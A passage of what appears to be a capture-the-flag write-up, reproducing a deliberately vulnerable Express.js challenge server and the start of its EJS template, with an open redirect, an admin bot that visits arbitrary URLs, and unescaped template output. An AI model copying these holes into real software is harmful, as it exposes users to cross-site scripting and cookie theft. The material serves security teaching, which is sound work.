style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sharedby\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sanitize\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(req.query.sharedby \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">username\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.cookies.username \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"GUEST\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">flag\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.cookies.flag \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">render\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"index\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, { sharedby, username, flag });\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/login\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">secret\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.secret \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (secret \u003C/span>\u003Cspan style=\"--0:#F97583\">!==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">ADMIN_PASSWORD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">status\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">401\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).\u003C/span>\u003Cspan style=\"--0:#B392F0\">send\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"login fail\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">cookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"username\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ADMIN\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">cookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"flag\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">FLAG\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, { httpOnly: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">true\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> });\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">redirect\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/view\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">content\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.content;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">clrs\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">; i \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">; i\u003C/span>\u003Cspan style=\"--0:#F97583\">++\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">clrs.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"#\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">randomhexstring\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">6\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">render\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, { content, clrs });\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/redirect\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> url \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.url;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"http://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"http://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> url;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">redirect\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(url);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/bot\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.url;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#B392F0\">bot_goto\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(url, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">ADMIN_PASSWORD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">send\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"OK\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">listen\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4444\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"0.0.0.0\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, () \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Server is running on http://0.0.0.0:4444\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"const app = express();...app.set(&#x22;view engine&#x22;, &#x22;ejs&#x22;);app.use(cookieParser());app.use(&#x27;/static&#x27;, express.static(&#x27;public&#x27;))app.use((req, res, next) => {    for (const key in req.query) {        let value = req.query[key];        delete req.query[key];        req.query[key.toLowerCase()] = value;    }    next();});app.get(&#x22;/&#x22;, (req, res) => {    const sharedby = sanitize(req.query.sharedby || &#x22;&#x22;);    const username = req.cookies.username || &#x22;GUEST&#x22;;    const flag = req.cookies.flag || &#x22;&#x22;;    res.render(&#x22;index&#x22;, { sharedby, username, flag });});app.get(&#x22;/login&#x22;, (req, res) => {    const secret = req.query.secret || &#x22;&#x22;;    if (secret !== ADMIN_PASSWORD) {        res.status(401).send(&#x22;login fail&#x22;);    } else {        res.cookie(&#x22;username&#x22;, &#x22;ADMIN&#x22;);        res.cookie(&#x22;flag&#x22;, FLAG, { httpOnly: true });        res.redirect(&#x22;/&#x22;);    }});app.get(&#x22;/view&#x22;, (req, res) => {    const content = req.query.content;    const clrs = [];    for (let i = 0; i \u003C 4; i++) {        clrs.push(&#x22;#&#x22; + randomhexstring(6));    }    res.render(&#x22;view&#x22;, { content, clrs });});app.get(&#x22;/redirect&#x22;, (req, res) => {    let url = req.query.url;    if (!url.startsWith(&#x22;http://&#x22;) &#x26;&#x26; !url.startsWith(&#x22;https://&#x22;)) {        url = &#x22;http://&#x22; + url;    }    res.redirect(url);});app.get(&#x22;/bot&#x22;, (req, res) => {    const url = req.query.url;    bot_goto(url, ADMIN_PASSWORD);    res.send(&#x22;OK&#x22;);});app.listen(4444, &#x22;0.0.0.0&#x22;, () => {    console.log(&#x22;Server is running on http://0.0.0.0:4444&#x22;);});\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We also have an ejs template for \u003Ccode>index.ejs\u003C/code>, which is as follows:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;!\u003C/span>\u003Cspan style=\"--0:#85E89D\">DOCTYPE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">lang\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"en\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">meta\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">charset\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"UTF-8\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">meta\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">name\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"viewport\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">content\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"width=device-width, initial-scale=1.0\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">Fancy Text Viewer\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% if (sharedby) { %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">| Shared by \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">%- sharedby %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% } %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;!\u003C/span>\u003Cspan style=\"--0:#85E89D\">DOCTYPE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">head\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan 